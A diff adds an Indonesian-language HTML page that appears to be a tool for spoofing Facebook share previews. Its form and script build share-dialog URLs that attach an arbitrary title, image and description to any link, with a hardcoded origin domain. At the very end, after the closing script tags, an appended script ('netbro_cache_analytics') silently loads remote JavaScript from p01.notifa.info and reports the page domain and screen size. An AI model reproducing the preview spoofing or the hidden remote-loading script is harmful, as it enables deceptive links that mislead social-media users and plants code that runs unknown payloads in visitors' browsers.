@@ -1,0 +1,188 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="shortcut icon" href="favicon.jpg">
+</head>
+<body>
+<center>
+    <div class="container" style="width:450px;">
+        <center>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>kirim</title>
+<script type="text/javascript">
+//<![CDATA[
+window.__cfRocketOptions = {byc:0,p:0,petok:"597e00df227756a6adb1d9fd882a3d4374ff138f-1509451478-3600"};
+//]]>
+</script>
+<style media="screen">
+        * { box-sizing: border-box; }
+        html, body {
+          background: url() no-repeat fixed;
+-webkit-background-size: 100% 100%;
+-moz-background-size: 100% 100%;
+-o-background-size: 100% 100%;
+background-size: 100% 100%;
+        }
+        body {
+            padding: 2rem;
+            font-size: .9rem;
+        }
+        body, input, textarea {
+            font-family: Roboto, Helvetica, FreeSans, sans-serif;
+        }
+        h1 {
+            margin: 0;
+            font-size: 1.25rem;
+        }
+		h2 {
+			margin: 0;
+			font-size: 1.125rem;
+		}
+        h1, a, label {
+            color: #3b5998;
+        }
+        h4 { margin: 1em 0 .5em; }
+        p, ul { margin: .66em 0; }
+        .content {
+          padding: 1.5rem;
+          max-width: 40rem;
+          margin: 0 auto;
+          background-color: hsl(0, 0%, 95%);
+          box-shadow:0 0.125rem 0.25rem rgba(0, 0, 0, 0.25);
+          border-radius: .125rem;
+        }
+		.comments {
+			padding: 0 1.5rem;
+			max-width: 40rem;
+			margin: 2rem auto 0;
+		}
+        label {
+            display: block;
+            margin-top: 1rem;
+            font-size: .8rem;
+        }
+        input, textarea {
+            font-size: .8rem;
+            border: 1px solid hsl(0, 0%, 80%);
+            border-radius: .25rem;
+            padding: .5rem;
+            margin-top: .25rem;
+            resize: vertical;
+            display: block;
+            width: 100%;
+            color: black;
+        }
+        label, #send {
+            text-transform: uppercase;
+            letter-spacing: .05rem;
+            font-weight: bold;
+        }
+        #send {
+            border: 0;
+            color: white;
+            background-color: #3b5998;
+        }
+
+        #disqus-placeholder {
+            color: hsl(0, 0%, 75%);
+            border: 1px solid hsl(0, 0%, 75%);
+            min-height: 20em;
+            padding: 9em 1em;
+            text-align: center;
+        }
+        #disqus-placeholder img {
+            width: 4em;
+            margin-bottom: 1em;
+        }
+        .is-hidden { display: none; }
+
+        @media only screen and (max-width: 480px) {
+            body { padding: 0 0 0.5rem 0; }
+            .content {
+                max-width: 100%;
+                border-radius: 0;
+			}
+			.comments {
+				max-width:100%;
+				margin-top: 1.5rem;
+                margin-bottom: 1rem;
+            }
+        }
+        </style>
+        <div class="content">
+<form action="https://www.facebook.com/sharer/sharer.php" method="get" target="_blank">
+<label>URL LINK
+<input type="url" pattern="https?://.+" name="u" required="">
+</label>
+<label>URL GAMBAR
+<input type="url" pattern="https?://.+" name="picture">
+</label>
+<label>TITEL
+<input type="text" name="title">
+</label>
+<label>DESCRIPTION
+<textarea name="description" rows="3" cols="80"></textarea>
+</p><p>
+</label>
+<input id="send" type="button" value="SUMBIT MAS">
+</label>
+</form>
+<div class="separator" style="clear: both; text-align: center;"></div>
+</div>
+<script src="https://code.jquery.com/jquery-3.2.1.slim.js" integrity="sha256-tA8y0XqiwnpwmOIl3SGAcFl2RvxHjA8qp0+1uCGmRmg=" crossorigin="anonymous" type="text/javascript"></script>
+<script type="text/javascript">
+        window.fbAsyncInit = function() {
+            FB.init({
+                appId: '448628399274496',
+                autoLogAppEvents: true,
+                xfbml: true,
+                version: 'v3.0'
+            });
+            FB.AppEvents.logPageView();
+        };
+
+        (function(d, s, id){
+            var js, fjs = d.getElementsByTagName(s)[0];
+            if (d.getElementById(id)) {return;}
+            js = d.createElement(s); js.id = id;
+            js.src = "//connect.facebook.net/en_US/sdk.js";
+            fjs.parentNode.insertBefore(js, fjs);
+        }(document, 'script', 'facebook-jssdk'));
+
+        $('#send').click(function() {
+            var params = {
+                'og:url': $('[name=u]').val(),
+                'og:title': $('[name=title]').val().trim()
+            };
+            var description = $('[name=description]').val().trim();
+            var image = $('[name=picture]').val();
+            if (description.length) {
+                params['og:description'] = description;
+            }
+            if (image.length) {
+                params['og:image'] = image;
+            }
+			var domain = "tr.im";
+			var data = {
+            //FB.ui({
+                //method: 'share_open_graph',
+                action_type: 'og.shares',
+                //display: 'popup',
+				app_id: '448628399274496',
+                action_properties: JSON.stringify({ object: params }),
+				sdk: 'joey',
+				version: 'v3.2',
+				next : 'https://staticxx.facebook.com/connect/xd_arbiter/r/lY4eZXm_YWu.js?version=42#cb=f178bb82679399&domain='+domain+'&origin=https%3A%2F%2F'+domain+'%2Ff3ec09ca44bdc94&relation=opener&frame=f295fa5752ca374&result=%22xxRESULTTOKENxx%22',
+            //});
+			};
+			var str = jQuery.param( data );
+			var url = 'https://www.facebook.com/v3.3/dialog/share_open_graph?'+str;
+			window.open(url, '_blank');
+        });
+        </script>
+        </div>			
+</script>		
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2Lkl7JBydG1o%2bLsdpR%2fkQBRB7egDPI0VAleeXDPpdcH3dtLSwgDg48Wcw7ruAjyFPCCF%2b%2bAYYorGCWEzJZDe7iQJaObPaQHTwP2Vd%2bl8fyg6aPlDDG1vgLfq3npI1qMNjPkBWKmB%2b3%2f8FEUeHUc5F2cyQbeOETYc9bk0FMs%2bov0Zl4FwGIPs8QvhDQNk5fVDHgLI3Faabye1s54FbAAdVRyPYjBzK4Je%2bCFoJ0tv06blVKzKMklohhZXvB7QW6pDnZjagMO8iPJozhSBw0sybIl8kfHlIfjZkS3X9f0GC9Ai1yKAQIKuiSbz2at10x%2bxx494coKc8d4BrseYEQSBrsNFIwDKzmmvJZi3dUmThAZQtPX81Z1v22LgomMYE59wbc%2ff4IJjIifieuLBhHX72yD3%2fpkB3jvYSJFM6N9BWpIGJ3VDfLAQSdfS8OKH%2b3elLqzm98bIvtrfB2W1PHeGzTGsib1UWJ9BmQldOW9ghxU1UDyHw8sfH%2bCxpPcm25gKCXp0%2fTmvYaCC5MljYGG8Y4487%2fY4X2r7pAKOYfSBnoRwxRRyfgYbafg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
